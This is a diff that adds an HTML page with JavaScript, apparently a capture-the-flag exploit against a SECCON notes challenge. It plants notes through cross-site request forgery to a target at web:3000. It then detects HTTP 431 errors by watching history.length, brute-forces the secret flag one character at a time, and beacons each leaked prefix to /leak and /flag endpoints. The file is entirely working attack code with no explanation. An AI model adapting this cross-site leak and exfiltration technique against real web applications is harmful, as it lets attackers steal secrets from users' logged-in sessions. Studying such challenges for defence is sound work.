@@ -1,0 +1,117 @@
+<body>
+  <form id="create" action="..." method="post" target="csrf">
+    <input type="text" name="note" />
+  </form>
+  <script type="module">
+    const BASE_URL = "http://web:3000";
+    const CHARS = [..."_abcdefghijklmnopqrstuvwxyz"];
+
+    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+    const debug = (o) => navigator.sendBeacon("/debug", JSON.stringify(o));
+    // const debug = (o) => console.log(o);
+
+    let known = new URLSearchParams(location.search).get("known") ?? "SECCON{";
+
+    const csrfWin = open("about:blank", "csrf");
+    const createNote = async (note) => {
+      const form = document.forms[0];
+      form.action = `${BASE_URL}/new`;
+      form.note.value = note;
+      form.submit();
+      await sleep(100);
+    };
+
+    const prepared = new Set();
+    const prepare = async (prefix) => {
+      if (prepared.has(prefix)) return;
+      prepared.add(prefix);
+
+      const initialLen = 443;
+      const part = "\n        <li>" + "</li>\n      ";
+
+      let len = initialLen;
+      while (16 ** 3 - len - part.length - 1 > 0) {
+        const note = prefix.padEnd(
+          Math.min(1024, 16 ** 3 - len - part.length - 1),
+          "*"
+        );
+        len += note.length + part.length;
+        await createNote(note);
+      }
+    };
+
+    let win = open("about:blank");
+
+    const getUrl = (prefix, padLength, nonce) =>
+      `${BASE_URL}/?${new URLSearchParams({
+        query: prefix,
+        pad: nonce.padEnd(padLength, "x"),
+      })}`;
+
+    const got431 = async (prefix, padLength) => {
+      await prepare(prefix);
+
+      const nonce = (Math.random() + "").padEnd(20, "0");
+      const url = getUrl(prefix, padLength, nonce);
+
+      const len1 = win.history.length;
+
+      win.location = url;
+      await sleep(100);
+      win.location = url;
+      await sleep(100);
+      win.location = "about:blank";
+      await sleep(100);
+      const len2 = win.history.length;
+
+      const diff = len2 - len1;
+      // If a 431 error occurs: diff === 2
+      // Otherwise: diff === 3
+
+      if (len2 > 45) {
+        // In Chromium, the maximum number of `history.length` is 50.
+        // ref. https://source.chromium.org/chromium/chromium/src/+/df9f2fd80f9b8697c877c2c7e7f19d9f389291b8:third_party/blink/public/common/history/session_history_constants.h;l=11
+        win.close();
+        win = open("about:blank");
+        await sleep(100);
+      }
+
+      debug({ prefix, len1, len2, diff });
+      return diff === 2;
+    };
+
+    let left = 10000;
+    let right = 18000;
+    const getThreshold = async () => {
+      left -= 50;
+      while (right - left > 1) {
+        const mid = (right + left) >> 1;
+        if (await got431(known + "X", mid)) {
+          right = mid;
+        } else {
+          left = mid;
+        }
+      }
+
+      return left;
+    };
+
+    while (true) {
+      const threshold = await getThreshold();
+      debug({ length: known.length, threshold });
+      let exists = false;
+      for (const c of CHARS) {
+        if (await got431(known + c, threshold)) {
+          known += c;
+          exists = true;
+          navigator.sendBeacon("/leak", known);
+          break;
+        }
+      }
+      if (!exists) break;
+    }
+
+    const flag = known + "}";
+    navigator.sendBeacon("/flag", flag);
+  </script>
+</body>
